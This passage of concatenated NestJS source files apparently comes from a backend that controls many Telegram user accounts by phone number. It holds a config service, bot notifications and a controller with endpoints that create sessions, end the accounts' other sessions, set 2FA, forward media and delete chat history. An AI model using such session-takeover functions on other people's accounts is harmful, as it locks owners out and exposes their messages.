console.log('MongoDB Connection Closed');\n    });\n  }\n\n  private startHealthCheck(): void {\n    this.connectionHealthCheckInterval = setInterval(async () => {\n      try {\n        if (this.connection.readyState === 1) {\n          await this.connection.db.admin().ping();\n        }\n      } catch (error) {\n        console.error('MongoDB health check failed:', error);\n      }\n    }, this.HEALTH_CHECK_INTERVAL);\n  }\n\n  private stopHealthCheck(): void {\n    if (this.connectionHealthCheckInterval) {\n      clearInterval(this.connectionHealthCheckInterval);\n      this.connectionHealthCheckInterval = undefined;\n    }\n  }\n\n  private async sendNotification(message: string): Promise<void> {\n    try {\n      const url = `${notifbot()}&text=${encodeURIComponent(message)}`;\n      await fetchWithTimeout(url, { timeout: 5000 });\n    } catch (error) {\n      console.warn('Failed to send notification:', error);\n      // Don't throw - notification failure shouldn't break initialization\n    }\n  }\n\n  private delay(ms: number): Promise<void> {\n    return new Promise(resolve => setTimeout(resolve, ms));\n  }\n\n  async onModuleDestroy(): Promise<void> {\n    if (InitModule.initializationStatus.isDestroying) {\n      return;\n    }\n\n    InitModule.initializationStatus.isDestroying = true;\n\n    try {\n      console.log('Init Module destroying...');\n\n      this.stopHealthCheck();\n      await this.sendNotification(`closed :: ${process.env.clientId}`);\n\n      if (this.connection && this.connection.readyState !== 0) {\n        console.log('Closing MongoDB connection...');\n        await this.connection.close(true);\n      }\n\n    } catch (error) {\n      console.error('Error during module destruction:', error);\n    } finally {\n      InitModule.initializationStatus = {\n        isInitialized: false,\n        isInitializing: false,\n        isDestroying: false,\n      };\n    }\n  }\n\n  // Public method to check initialization status\n  static getInitializationStatus() {\n    return { ...InitModule.initializationStatus };\n  }\n\n  // Public method to check if module is ready\n  static isReady(): boolean {\n    return InitModule.initializationStatus.isInitialized && !InitModule.initializationStatus.isDestroying;\n  }\n}","import { Injectable, NotFoundException, OnModuleInit, Logger } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Configuration } from './configuration.schema';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { BotConfig } from '../../utils/TelegramBots.config';\nimport { ConfigService } from '@nestjs/config';\n\n@Injectable()\nexport class ConfigurationService implements OnModuleInit {\n    private readonly logger = new Logger(ConfigurationService.name);\n    private static initialized = false;\n\n    constructor(\n        @InjectModel('configurationModule') private configurationModel: Model<Configuration>,\n        private configService: ConfigService\n    ) { }\n\n    async onModuleInit() {\n        if (ConfigurationService.initialized) {\n            return;\n        }\n\n        try {\n            await this.initializeConfiguration();\n            ConfigurationService.initialized = true;\n        } catch (error) {\n            this.logger.error('Failed to initialize configuration', error);\n            throw error;\n        }\n    }\n\n    private async initializeConfiguration() {\n        this.logger.log('Initializing configuration service...');\n        await this.setEnv();\n        await BotConfig.getInstance().ready();\n        await this.notifyStart();\n        this.logger.log('Configuration service initialized successfully');\n    }\n\n    private async notifyStart() {\n        try {\n            const clientId = process.env.clientId || this.configService.get('clientId');\n            if (!clientId) {\n                this.logger.warn('No clientId found in environment or configuration');\n                return;\n            }\n            await fetchWithTimeout(\n                `${notifbot()}&text=${encodeURIComponent(`Started :: ${clientId}`)}`\n            );\n        } catch (error) {\n            this.logger.warn('Failed to send start notification', error);\n        }\n    }\n\n    async findOne(): Promise<Configuration> {\n        const configuration = await this.configurationModel.findOne({}).lean().exec();\n        if (!configuration) {\n            throw new NotFoundException('Configuration not found');\n        }\n        return configuration;\n    }\n\n    async setEnv() {\n        this.logger.log('Setting environment variables...');\n        const configuration = await this.configurationModel.findOne({}, { _id: 0 }).lean();\n\n        if (!configuration) {\n            this.logger.warn('No configuration found in database, using environment variables only');\n            return;\n        }\n\n        for (const [key, value] of Object.entries(configuration)) {\n            if (value !== undefined && value !== null) {\n                // Don't override existing environment variables\n                if (!process.env[key]) {\n                    process.env[key] = String(value);\n                    this.logger.debug(`Set environment variable: ${key}`);\n                }\n            }\n        }\n\n        this.logger.log('Finished setting environment variables');\n    }\n\n    async update(updateDto: Partial<Configuration>): Promise<Configuration> {\n        const { _id, ...updateData } = updateDto as any;\n\n        try {\n            const updatedConfig = await this.configurationModel.findOneAndUpdate(\n                {},\n                { $set: updateData },\n                { new: true, upsert: true, lean: true }\n            ).exec();\n\n            if (!updatedConfig) {\n                throw new NotFoundException('Failed to update configuration');\n            }\n\n            // Update environment variables with new values\n            Object.entries(updateData).forEach(([key, value]) => {\n                if (value !== undefined && value !== null) {\n                    process.env[key] = String(value);\n                }\n            });\n\n            return updatedConfig;\n        } catch (error) {\n            this.logger.error('Failed to update configuration', error);\n            throw error;\n        }\n    }\n}\n","import { Controller, Get, Post, Body, Param, Query, BadRequestException, Res, Delete, Put, UseInterceptors, UploadedFile, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiQuery, ApiParam, ApiBody, ApiResponse, ApiConsumes, ApiBadRequestResponse, ApiNotFoundResponse, ApiOkResponse, ApiUnauthorizedResponse } from '@nestjs/swagger';\nimport { Response } from 'express';\nimport { TelegramService } from './Telegram.service';\nimport {\n    SendMediaDto,\n    SendMediaAlbumDto,\n    GroupSettingsDto,\n    GroupMemberOperationDto,\n    AdminOperationDto,\n    ChatCleanupDto,\n    UpdateProfileDto,\n    PrivacySettingsDto,\n    ProfilePhotoDto,\n    ScheduleMessageDto,\n    BatchProcessDto,\n    BatchOperationType,\n    ForwardBatchDto,\n    ContactExportImportDto,\n    ContactBlockListDto,\n    AddContactsDto,\n    MediaType,\n    createGroupDto,\n    ViewOnceMediaDto,\n    MediaSourceType,\n    CreateBotDto\n} from './dto';\nimport { MediaMetadataDto } from './dto/metadata-operations.dto';\nimport { CreateChatFolderDto } from './dto/create-chat-folder.dto';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport { ChatStatistics } from '../../interfaces/telegram';\nimport { ConnectionStatusDto, ConnectionStatsDto, GetClientOptionsDto } from './dto/connection-management.dto';\nimport { FileInterceptor } from '@nestjs/platform-express';\nimport * as multer from 'multer';\nimport { connectionManager } from './utils/connection-manager';\nimport { SearchMessagesDto, SearchMessagesResponseDto } from './dto/message-search.dto';\nimport { DeleteHistoryDto } from './dto/delete-chat.dto';\nimport { UpdateUsernameDto } from './dto/update-username.dto';\nimport { SendMessageDto } from './dto/send-message.dto';\n\n@Controller('telegram')\n@ApiTags('Telegram')\nexport class TelegramController {\n    constructor(private readonly telegramService: TelegramService) { }\n\n    @Get('connect/:mobile')\n    @ApiOperation({ summary: 'Connect to Telegram' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'autoDisconnect', description: 'Whether to auto disconnect the client after period of inactivity', required: false, type: Boolean, default: true })\n    @ApiQuery({ name: 'handler', description: 'Whether to use event handler', required: false, type: Boolean, default: true })\n    @ApiQuery({ name: 'timeout', description: 'Connection timeout in milliseconds', required: false, type: Number, default: 30000 })\n    @ApiResponse({ status: 200, description: 'Successfully connected' })\n    @ApiResponse({ status: 400, description: 'Connection failed' })\n    async connect(\n        @Param('mobile') mobile: string,\n        @Query('autoDisconnect') autoDisconnect?: boolean,\n        @Query('handler') handler?: boolean,\n        @Query('timeout') timeout?: number\n    ): Promise<{ message: string }> {\n        const options: GetClientOptionsDto = {\n            autoDisconnect,\n            handler,\n            timeout\n        };\n        await this.telegramService.connect(mobile, options);\n        return { message: 'Connected successfully' };\n    }\n\n    @Get('disconnect/:mobile')\n    @ApiOperation({ summary: 'Disconnect from Telegram' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Successfully disconnected' })\n    async disconnect(@Param('mobile') mobile: string): Promise<{ message: string }> {\n        await this.telegramService.disconnect(mobile);\n        return { message: 'Disconnected successfully' };\n    }\n\n    @Get('disconnect-all')\n    @ApiOperation({ summary: 'Disconnect all clients' })\n    @ApiResponse({ status: 200, description: 'All clients disconnected successfully' })\n    async disconnectAll(): Promise<{ message: string }> {\n        await this.telegramService.disconnectAll();\n        return { message: 'All clients disconnected successfully' };\n    }\n\n    @Get('connection/stats')\n    @ApiOperation({ summary: 'Get connection statistics' })\n    @ApiResponse({ status: 200, type: ConnectionStatsDto })\n    getConnectionStats(): ConnectionStatsDto {\n        return this.telegramService.getConnectionStats();\n    }\n\n    @Get('connection/state/:mobile')\n    @ApiOperation({ summary: 'Get connection state for a client' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, type: ConnectionStatusDto })\n    @ApiResponse({ status: 404, description: 'Client not found' })\n    getClientState(@Param('mobile') mobile: string): ConnectionStatusDto | undefined {\n        return this.telegramService.getClientState(mobile);\n    }\n\n    @Get('connection/count')\n    @ApiOperation({ summary: 'Get active connection count' })\n    @ApiResponse({ status: 200, description: 'Number of active connections' })\n    getActiveConnectionCount(): number {\n        return this.telegramService.getActiveConnectionCount();\n    }\n\n    @Get('me/:mobile')\n    @ApiOperation({ summary: 'Get current user profile' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Profile retrieved successfully' })\n    async getMe(@Param('mobile') mobile: string) {\n        return this.telegramService.getMe(mobile);\n    }\n\n    @Get('entity/:mobile/:entity')\n    @ApiOperation({ summary: 'Get Entity profile' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiParam({ name: 'entity', description: 'Entity identifier', required: true })\n    @ApiResponse({ status: 200, description: 'Entity retrieved successfully' })\n    async getEntity(@Param('mobile') mobile: string, @Param('entity') entity: string) {\n        return this.telegramService.getEntity(mobile, entity);\n    }\n\n    @Post('profile/update/:mobile')\n    @ApiOperation({ summary: 'Update profile information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: UpdateProfileDto })\n    async updateProfile(\n        @Param('mobile') mobile: string,\n        @Body() updateProfileDto: UpdateProfileDto\n    ) {\n        return this.telegramService.updateNameandBio(\n            mobile,\n            updateProfileDto.firstName,\n            updateProfileDto.about\n        );\n    }\n\n    @Post('profile/photo/:mobile')\n    @ApiOperation({ summary: 'Set profile photo' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ProfilePhotoDto })\n    async setProfilePhoto(\n        @Param('mobile') mobile: string,\n        @Body() photoDto: ProfilePhotoDto\n    ) {\n        return this.telegramService.setProfilePic(mobile, photoDto.name);\n    }\n\n    @Delete('profile/photos/:mobile')\n    @ApiOperation({ summary: 'Delete all profile photos' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async deleteProfilePhotos(@Param('mobile') mobile: string) {\n        return this.telegramService.deleteProfilePhotos(mobile);\n    }\n\n    // Message Operations\n    @Get('messages/:mobile')\n    @ApiOperation({ summary: 'Get chat messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'limit', required: false, type: Number })\n    async getMessages(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('limit') limit?: number\n    ) {\n        return this.telegramService.getMessages(mobile, chatId, limit);\n    }\n\n\n    @Post('message/:mobile')\n    @ApiOperation({ summary: 'Send a Telegram message as a user' })\n    @ApiParam({\n        name: 'mobile',\n        description: 'Mobile number of the user account to send the message from',\n        required: true,\n        example: '1234567890',\n    })\n    async sendMessage(\n        @Param('mobile') mobile: string,\n        @Body() dto: SendMessageDto,\n    ) {\n        return this.telegramService.sendMessage(mobile, dto);\n    }\n\n    @Post('messages/forward/:mobile')\n    @ApiOperation({ summary: 'Forward messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ForwardBatchDto })\n    async forwardMessage(\n        @Param('mobile') mobile: string,\n        @Body() forwardDto: ForwardBatchDto\n    ) {\n        return this.telegramService.forwardBulkMessages(\n            mobile,\n            forwardDto.fromChatId,\n            forwardDto.toChatId,\n            forwardDto.messageIds\n        );\n    }\n\n    @Post('batch-process/:mobile')\n    @ApiOperation({ summary: 'Process operations in batches' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: BatchProcessDto })\n    async processBatchMessages(\n        @Param('mobile') mobile: string,\n        @Body() batchOp: BatchProcessDto\n    ) {\n        return this.telegramService.processBatch(\n            batchOp.items,\n            batchOp.batchSize || 20,\n            async (batch) => {\n                switch (batchOp.operation) {\n                    case BatchOperationType.FORWARD:\n                        for (const item of batch) {\n                            if ('messageId' in item && item.fromChatId && item.toChatId) {\n                                await this.telegramService.forwardMessage(\n                                    mobile,\n                                    item.toChatId,\n                                    item.fromChatId,\n                                    item.messageId\n                                );\n                            }\n                        }\n                        break;\n                    case BatchOperationType.DELETE:\n                        for (const item of batch) {\n                            await this.telegramService.deleteChat(mobile, { peer: item.chatId, justClear: true });\n                        }\n                        break;\n                    default:\n                        throw new BadRequestException('Unsupported batch operation');\n                }\n            },\n            batchOp.delayMs\n        );\n    }\n\n    @Get('messages/search/:mobile')\n    @ApiOperation({\n        summary: 'Search messages in Telegram',\n        description: 'Search for messages in a specific chat or globally across all chats'\n    })\n    @ApiOkResponse({\n        description: 'Messages successfully found',\n        type: SearchMessagesResponseDto\n    })\n    @ApiBadRequestResponse({ description: 'Invalid request parameters' })\n    @ApiNotFoundResponse({ description: 'Mobile number not registered' })\n    @ApiUnauthorizedResponse({ description: 'Unauthorized access' })\n    async searchMessages(\n        @Param('mobile') mobile: string,\n        @Query() queryParams: SearchMessagesDto\n    ): Promise<SearchMessagesResponseDto> {\n        return this.telegramService.searchMessages(mobile, queryParams);\n    }\n\n    // Channel Operations\n    @Get('channels/:mobile')\n    @ApiOperation({ summary: 'Get channel information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'includeIds', required: false, type: Boolean })\n    async getChannelInfo(\n        @Param('mobile') mobile: string,\n        @Query('includeIds') includeIds?: boolean\n    ) {\n        return this.telegramService.getChannelInfo(mobile, includeIds);\n    }\n\n    @Post('forwardMediatoMe/:mobile')\n    @ApiOperation({ summary: 'Forward media messages to me' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'channel', description: 'Channel username or ID', required: false })\n    @ApiQuery({ name: 'fromChatId', description: 'Source chat ID to forward messages from', required: false })\n    async forwardMedia(\n        @Param('mobile') mobile: string,\n        @Query('channel') channel?: string,\n        @Query('fromChatId') fromChatId?: string\n    ) {\n        await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n        return this.telegramService.forwardMedia(\n            mobile,\n            channel,\n            fromChatId\n        );\n    }\n\n    @Post('channels/leave/:mobile')\n    @ApiOperation({ summary: 'Leave channel' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'channel', description: 'Channel ID/username', required: true })\n    async leaveChannel(\n        @Param('mobile') mobile: string,\n        @Query('channel') channel: string\n    ) {\n        return this.telegramService.leaveChannel(mobile, channel);\n    }\n\n    @Patch('username/:mobile')\n    @ApiOperation({ summary: 'Update the Telegram username of a user' })\n    @ApiParam({\n        name: 'mobile',\n        description: 'Mobile number of the user whose username should be updated',\n        required: true,\n        example: '1234567890',\n    })\n    async updateUsername(\n        @Param('mobile') mobile: string,\n        @Body() updateUsernameDto: UpdateUsernameDto,\n    ) {\n        return this.telegramService.updateUsername(mobile, updateUsernameDto.newUsername);\n    }\n\n    // Security & Privacy\n    @Post('2fa/:mobile')\n    @ApiOperation({ summary: 'Setup two-factor authentication' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async setup2FA(@Param('mobile') mobile: string) {\n        return this.telegramService.set2Fa(mobile);\n    }\n\n    @Post('privacy/:mobile')\n    @ApiOperation({ summary: 'Update privacy settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async updatePrivacy(@Param('mobile') mobile: string) {\n        return this.telegramService.updatePrivacy(mobile);\n    }\n\n    @Post('privacy/batch/:mobile')\n    @ApiOperation({ summary: 'Update multiple privacy settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: PrivacySettingsDto })\n    async updatePrivacyBatch(\n        @Param('mobile') mobile: string,\n        @Body() settings: PrivacySettingsDto\n    ) {\n        return this.telegramService.updatePrivacyBatch(mobile, settings);\n    }\n\n    // Session Management\n    @Get('sessions/:mobile')\n    @ApiOperation({ summary: 'Get active sessions' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Active sessions retrieved successfully' })\n    async getActiveSessions(@Param('mobile') mobile: string) {\n        return this.telegramService.getAuths(mobile);\n    }\n\n    @Delete('sessions/:mobile')\n    @ApiOperation({ summary: 'Terminate other sessions' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Other sessions terminated successfully' })\n    async terminateOtherSessions(@Param('mobile') mobile: string) {\n        return this.telegramService.removeOtherAuths(mobile);\n    }\n\n    @Post('sessions/new/:mobile')\n    @ApiOperation({ summary: 'Create new session' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'New session created successfully' })\n    async createNewSession(@Param('mobile') mobile: string) {\n        return this.telegramService.createNewSession(mobile);\n    }\n\n    @Get('session/info/:mobile')\n    @ApiOperation({ summary: 'Get session information' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getSessionInfo(@Param('mobile') mobile: string) {\n        return this.telegramService.getSessionInfo(mobile);\n    }\n\n    @Post('session/terminate/:mobile')\n    @ApiOperation({ summary: 'Terminate specific session' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async terminateSession(\n        @Param('mobile') mobile: string,\n        @Body() data: {\n            hash: string;\n            type: 'app' | 'web';\n            exceptCurrent?: boolean;\n        }\n    ) {\n        return this.telegramService.terminateSession(mobile, data);\n    }\n\n    // Monitoring & Health\n    @Get('monitoring/status')\n    @ApiOperation({ summary: 'Get service health and connection status' })\n    @ApiResponse({ status: 200, type: ConnectionStatusDto })\n    async getConnectionStatus() {\n        return {\n            status: await this.telegramService.getConnectionStatus()\n        };\n    }\n\n    @Get('monitoring/calllog/:mobile')\n    @ApiOperation({ summary: 'Get call log statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async getCallLogStats(@Param('mobile') mobile: string) {\n        return this.telegramService.getCallLog(mobile);\n    }\n\n    // Contact Management\n    @Post('contacts/add-bulk/:mobile')\n    @ApiOperation({ summary: 'Add multiple contacts in bulk' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AddContactsDto })\n    @ApiResponse({ status: 200, description: 'Contacts added successfully' })\n    async addContactsBulk(\n        @Param('mobile') mobile: string,\n        @Body() contactsDto: AddContactsDto\n    ) {\n        return this.telegramService.addContacts(\n            mobile,\n            contactsDto.phoneNumbers,\n            contactsDto.prefix\n        );\n    }\n\n    @Get('contacts/:mobile')\n    @ApiOperation({ summary: 'Get all contacts' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Contacts retrieved successfully' })\n    async getContacts(@Param('mobile') mobile: string) {\n        return await this.telegramService.getContacts(mobile);\n    }\n\n    //To Cleanup\n    @Post('media/send/:mobile')\n    @ApiOperation({ summary: 'Send media message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: SendMediaDto })\n    async sendMedia(\n        @Param('mobile') mobile: string,\n        @Body() sendMediaDto: SendMediaDto\n    ) {\n        const client = await connectionManager.getClient(mobile);\n        if (sendMediaDto.type === MediaType.PHOTO) {\n            return client.sendPhotoChat(\n                sendMediaDto.chatId,\n                sendMediaDto.url,\n                sendMediaDto.caption,\n                sendMediaDto.filename\n            );\n        }\n        return client.sendFileChat(\n            sendMediaDto.chatId,\n            sendMediaDto.url,\n            sendMediaDto.caption,\n            sendMediaDto.filename\n        );\n    }\n\n    @Get('media/download/:mobile')\n    @ApiOperation({ summary: 'Download media from a message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'messageId', required: true })\n    async downloadMedia(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('messageId') messageId: number,\n        @Res() res: Response\n    ) {\n        return this.telegramService.downloadMediaFile(mobile, messageId, chatId, res);\n    }\n\n    @Post('media/album/:mobile')\n    @ApiOperation({ summary: 'Send media album (multiple photos/videos)' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: SendMediaAlbumDto })\n    async sendMediaAlbum(\n        @Param('mobile') mobile: string,\n        @Body() albumDto: MediaAlbumOptions\n    ) {\n        return this.telegramService.sendMediaAlbum(mobile, albumDto);\n    }\n\n    @Get('media/metadata/:mobile')\n    @ApiOperation({ summary: 'Get media metadata from a chat' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'types', enum: ['photo', 'video', 'document'], required: false, isArray: true })\n    @ApiQuery({ name: 'startDate', required: false })\n    @ApiQuery({ name: 'endDate', required: false })\n    @ApiQuery({ name: 'limit', description: 'Number of messages to fetch', required: false, type: Number })\n    @ApiQuery({ name: 'minId', required: false, type: Number })\n    @ApiQuery({ name: 'maxId', required: false, type: Number })\n    async getMediaMetadata(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('types') types?: ('photo' | 'video' | 'document' | 'voice')[],\n        @Query('startDate') startDate?: string,\n        @Query('endDate') endDate?: string,\n        @Query('limit') limit?: number,\n        @Query('minId') minId?: number,\n        @Query('maxId') maxId?: number,\n        @Query('all') all?: boolean\n    ) {\n        return this.telegramService.getMediaMetadata(mobile, {\n            chatId,\n            types,\n            startDate: startDate ? new Date(startDate) : undefined,\n            endDate: endDate ? new Date(endDate) : undefined,\n            limit,\n            minId,\n            maxId,\n            all\n        });\n    }\n\n    @Get('media/filter/:mobile')\n    @ApiOperation({ summary: 'Get filtered media messages from a chat' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true, description: 'Chat ID to get media from' })\n    @ApiQuery({ name: 'types', required: false, enum: ['photo', 'video', 'document', 'voice'], isArray: true })\n    @ApiQuery({ name: 'startDate', required: false, description: 'Filter media after this date' })\n    @ApiQuery({ name: 'endDate', required: false, description: 'Filter media before this date' })\n    @ApiQuery({ name: 'limit', required: false, type: Number, description: 'Number of media items to fetch' })\n    @ApiQuery({ name: 'minId', required: false, type: Number, description: 'Minimum message ID' })\n    @ApiQuery({ name: 'maxId', required: false, type: Number, description: 'Maximum message ID' })\n    @ApiResponse({ status: 200, type: [MediaMetadataDto] })\n    async getFilteredMedia(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('types') types?: ('photo' | 'video' | 'document' | 'voice')[],\n        @Query('startDate') startDate?: string,\n        @Query('endDate') endDate?: string,\n        @Query('limit') limit?: number,\n        @Query('minId') minId?: number,\n        @Query('maxId') maxId?: number\n    ) {\n        return this.telegramService.getFilteredMedia(mobile, {\n            chatId,\n            types,\n            startDate: startDate ? new Date(startDate) : undefined,\n            endDate: endDate ? new Date(endDate) : undefined,\n            limit,\n            minId,\n            maxId\n        });\n    }\n\n    @Get('group/members/:mobile')\n    @ApiOperation({ summary: 'Get group members' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    async getGroupMembers(\n        @Param('mobile') mobile: string,\n        @Query('groupId') groupId: string\n    ) {\n        return this.telegramService.getGrpMembers(mobile, groupId);\n    }\n\n    @Post('chat/block/:mobile')\n    @ApiOperation({ summary: 'Block a chat/user' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat/User ID to block', required: true })\n    async blockChat(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string\n    ) {\n        return this.telegramService.blockUser(mobile, chatId);\n    }\n\n    @Delete('chat/:mobile')\n    @ApiOperation({ summary: 'Delete or clear a chat history for a user' })\n    @ApiParam({\n        name: 'mobile',\n        description: 'Mobile number of the user whose chat should be deleted',\n        required: true,\n        example: '1234567890',\n    })\n    @ApiQuery({\n        name: 'peer',\n        description: 'Username or Peer ID of the chat to delete',\n        required: true,\n        example: 'someusername',\n    })\n    @ApiQuery({ name: 'maxId', required: false, description: 'Delete messages with ID ≤ maxId', example: 100000 })\n    @ApiQuery({ name: 'justClear', required: false, description: 'Only clear history for this user', example: false })\n    @ApiQuery({ name: 'revoke', required: false, description: 'Delete for everyone if possible', example: true })\n    @ApiQuery({ name: 'minDate', required: false, description: 'Minimum date (UNIX timestamp)', example: 1609459200 })\n    @ApiQuery({ name: 'maxDate', required: false, description: 'Maximum date (UNIX timestamp)', example: 1612137600 })\n    async deleteChatHistory(\n        @Param('mobile') mobile: string,\n        @Query() deleteHistoryDto: DeleteHistoryDto,\n    ) {\n        return this.telegramService.deleteChat(mobile, deleteHistoryDto);\n    }\n\n    // Additional Message Operations\n    @Get('messages/inline/:mobile')\n    @ApiOperation({ summary: 'Send message with inline button' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'message', required: true })\n    @ApiQuery({ name: 'url', required: true })\n    async sendMessageWithInlineButton(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('message') message: string,\n        @Query('url') url: string\n    ) {\n        return this.telegramService.sendInlineMessage(mobile, chatId, message, url);\n    }\n\n    // Dialog Management\n    @Get('dialogs/:mobile')\n    @ApiOperation({ summary: 'Get all dialogs' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'limit', required: false, type: Number, description: 'Number of dialogs to fetch', default: 500 })\n    @ApiQuery({ name: 'offsetId', required: false, type: Number, description: 'Offset ID for pagination', default: 0 })\n    @ApiQuery({ name: 'archived', required: false, type: Boolean, description: 'Include archived chats', default: false })\n    async getAllDialogs(\n        @Param('mobile') mobile: string,\n        @Query('limit') limit: number = 500,\n        @Query('offsetId') offsetId: number = 0,\n        @Query('archived') archived: boolean = false\n    ) {\n        return this.telegramService.getDialogs(mobile, { limit, archived, offsetId });\n    }\n\n    @Get('last-active/:mobile')\n    @ApiOperation({ summary: 'Get last active time' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ status: 200, description: 'Last active time retrieved successfully' })\n    async getLastActiveTime(@Param('mobile') mobile: string) {\n        return this.telegramService.getLastActiveTime(mobile);\n    }\n\n    // Enhanced Group Management\n    @Post('group/create/:mobile')\n    @ApiOperation({ summary: 'Create a new group with advanced options' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: createGroupDto })\n    async createGroupWithOptions(\n        @Param('mobile') mobile: string,\n        @Body() options: createGroupDto\n    ) {\n        return this.telegramService.createGroupWithOptions(mobile, options);\n    }\n\n    @Post('group/settings/:mobile')\n    @ApiOperation({ summary: 'Update group settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupSettingsDto })\n    async updateGroupSettings(\n        @Param('mobile') mobile: string,\n        @Body() settings: GroupSettingsDto\n    ) {\n        return this.telegramService.updateGroupSettings(mobile, settings);\n    }\n\n    @Post('group/members/:mobile')\n    @ApiOperation({ summary: 'Add members to a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async addGroupMembers(\n        @Body() memberOp: GroupMemberOperationDto,\n        @Param('mobile') mobile: string,\n    ) {\n        return this.telegramService.addGroupMembers(\n            mobile,\n            memberOp.groupId,\n            memberOp.members\n        );\n    }\n\n    @Delete('group/members/:mobile')\n    @ApiOperation({ summary: 'Remove members from a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    async removeGroupMembers(\n        @Body() memberOp: GroupMemberOperationDto,\n        @Param('mobile') mobile: string,\n    ) {\n        return this.telegramService.removeGroupMembers(\n            mobile,\n            memberOp.groupId,\n            memberOp.members\n        );\n    }\n\n    @Post('group/admin/:mobile')\n    @ApiOperation({ summary: 'Promote or demote group admins' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AdminOperationDto })\n    async handleAdminOperation(\n        @Body() adminOp: AdminOperationDto,\n        @Param('mobile') mobile: string\n    ) {\n        if (adminOp.isPromote) {\n            return this.telegramService.promoteToAdmin(\n                mobile,\n                adminOp.groupId,\n                adminOp.userId,\n                adminOp.permissions,\n                adminOp.rank\n            );\n        } else {\n            return this.telegramService.demoteAdmin(\n                mobile,\n                adminOp.groupId,\n                adminOp.userId\n            );\n        }\n    }\n\n    @Post('chat/cleanup/:mobile')\n    @ApiOperation({ summary: 'Clean up chat history' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ChatCleanupDto })\n    async cleanupChat(\n        @Param('mobile') mobile: string,\n        @Body() cleanup: ChatCleanupDto\n    ) {\n        return this.telegramService.cleanupChat(mobile, {\n            chatId: cleanup.chatId,\n            beforeDate: cleanup.beforeDate ? new Date(cleanup.beforeDate) : undefined,\n            onlyMedia: cleanup.onlyMedia,\n            excludePinned: cleanup.excludePinned\n        });\n    